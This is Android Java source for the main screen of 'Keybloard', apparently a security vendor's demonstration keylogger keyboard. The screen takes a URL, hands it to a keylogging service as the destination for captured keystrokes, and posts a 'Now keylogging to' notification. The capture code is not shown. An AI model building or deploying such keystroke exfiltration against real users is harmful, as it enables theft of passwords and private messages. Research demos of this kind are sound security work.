package com.withsecure.keybloard;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.NotificationCompat;
import androidx.core.app.NotificationManagerCompat;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import java.util.logging.Level;
import java.util.logging.Logger;


public class MainActivity extends AppCompatActivity {

    private Logger logcat = Logger.getLogger("Keybloard Menu");
    private int notificationId = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        createNotificationChannel();
    }

    private void createNotificationChannel() {
        // Create the NotificationChannel, but only on API 26+ because
        // the NotificationChannel class is new and not in the support library
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            CharSequence name = "Keybloard";
            String description = "Keybloard";
            int importance = NotificationManager.IMPORTANCE_DEFAULT;
            NotificationChannel channel = new NotificationChannel("keybloard", name, importance);
            channel.setDescription(description);
            // Register the channel with the system; you can't change the importance
            // or other notification behaviors after this
            NotificationManager notificationManager = getSystemService(NotificationManager.class);
            notificationManager.createNotificationChannel(channel);
        }
    }


    public void onURLButtonClick(android.view.View wowview)
    {
        logcat.log(Level.SEVERE, "clicky");
        EditText urlField = findViewById(R.id.editTextURL);
        String url = urlField.getText().toString();
        KeybloardService.setKeylogURL(url);
        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, "keybloard")
                .setSmallIcon(R.drawable.ic_launcher_background)
                .setContentTitle("Keybloard")
                .setContentText("Now keylogging to: " + url)
                .setStyle(new NotificationCompat.BigTextStyle()
                        .bigText("Now keylogging to: " + url))
                .setPriority(NotificationCompat.PRIORITY_DEFAULT);
        NotificationManagerCompat notificationManager = NotificationManagerCompat.from(this);
        notificationManager.notify(notificationId, builder.build());
        notificationId++;
        KeybloardService.setKeylogURL(url);
    }
}